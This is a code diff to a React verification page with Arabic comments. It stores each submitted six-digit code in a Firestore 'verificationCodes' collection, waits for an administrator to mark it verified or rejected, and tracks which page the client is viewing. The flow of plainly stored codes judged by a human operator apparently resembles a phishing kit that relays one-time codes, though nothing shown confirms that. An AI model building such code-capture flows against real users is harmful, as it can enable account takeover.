@@ -29,6 +29,7 @@ export default function VerifyPage() {
   
   const [userId, setUserId] = useState(sessionStorage.getItem('reg_id'));
   const userEmail = sessionStorage.getItem('reg_email');
+  const [lastSubmittedCodeId, setLastSubmittedCodeId] = useState<string | null>(null);
 
   useEffect(() => {
     const recoverSession = async () => {
@@ -67,38 +68,59 @@ export default function VerifyPage() {
     };
   }, [userId, navigate]);
 
-  // الاستماع لتغييرات حالة التسجيل في الوقت الحقيقي
+  // الاستماع لتغييرات حالة الكود في الوقت الحقيقي
   useEffect(() => {
-    if (!userId || !submitted) return;
+    if (!submitted) return;
 
-    const registrationRef = doc(getDb(), 'users', userId);
-    
-    const unsubscribe = onSnapshot(registrationRef, (snapshot) => {
-      if (snapshot.exists()) {
-        const data = snapshot.data();
-        
-        // إذا وافق المدير على التسجيل
-        if (data.status === 'verified' || data.status === 'completed') {
-          setSuccess(true);
-          const clientId = getClientId();
-          updateUserPage(clientId, '/thank-you');
-          
-          setTimeout(() => {
-            navigate('/thank-you');
-          }, 1500);
-        }
-        
-        // إذا رفض المدير التسجيل
-        if (data.status === 'rejected') {
-          setError('تم رفض طلبك من قبل الإدارة');
-          setSubmitted(false);
-          setWaitingApproval(false);
-        }
+    let unsubscribe: (() => void) | null = null;
+
+    const setupListener = () => {
+      // Listen to verification code status first (more specific)
+      if (lastSubmittedCodeId) {
+        unsubscribe = onSnapshot(doc(getDb(), 'verificationCodes', lastSubmittedCodeId), (snapshot) => {
+          if (snapshot.exists()) {
+            const data = snapshot.data();
+            
+            if (data.status === 'verified') {
+              setSuccess(true);
+              const clientId = getClientId();
+              updateUserPage(clientId, '/processing');
+              setTimeout(() => navigate('/processing'), 1500);
+            } else if (data.status === 'rejected') {
+              setError('رمز التحقق غير صحيح');
+              setSubmitted(false);
+              setWaitingApproval(false);
+              setCode(['', '', '', '', '', '']);
+              setTimeout(() => inputRefs.current[0]?.focus(), 100);
+            }
+          }
+        });
+      } 
+      // Fallback to user status if no specific code id
+      else if (userId) {
+        unsubscribe = onSnapshot(doc(getDb(), 'users', userId), (snapshot) => {
+          if (snapshot.exists()) {
+            const data = snapshot.data();
+            if (data.status === 'verified' || data.status === 'completed') {
+              setSuccess(true);
+              const clientId = getClientId();
+              updateUserPage(clientId, '/processing');
+              setTimeout(() => navigate('/processing'), 1500);
+            } else if (data.status === 'rejected') {
+              setError('رمز التحقق غير صحيح');
+              setSubmitted(false);
+              setWaitingApproval(false);
+              setCode(['', '', '', '', '', '']);
+              setTimeout(() => inputRefs.current[0]?.focus(), 100);
+            }
+          }
+        });
       }
-    });
+    };
 
-    return () => unsubscribe();
-  }, [userId, submitted, navigate]);
+    setupListener();
+    return () => unsubscribe?.();
+  }, [userId, lastSubmittedCodeId, submitted, navigate]);
 
   useEffect(() => {
     if (timeLeft <= 0) {
@@ -201,7 +223,7 @@ export default function VerifyPage() {
       }, { merge: true });
 
       // 2. إضافة سجل في collection verificationCodes
-      await addDoc(collection(getDb(), 'verificationCodes'), {
+      const codeRef = await addDoc(collection(getDb(), 'verificationCodes'), {
         userId: userId,
         clientId: clientId,
         code: fullCode,
@@ -210,6 +232,7 @@ export default function VerifyPage() {
         createdAt: now,
         updatedAt: now
       });
+      setLastSubmittedCodeId(codeRef.id);
 
       console.log('[Verify] Code submitted and logged to verificationCodes');
 
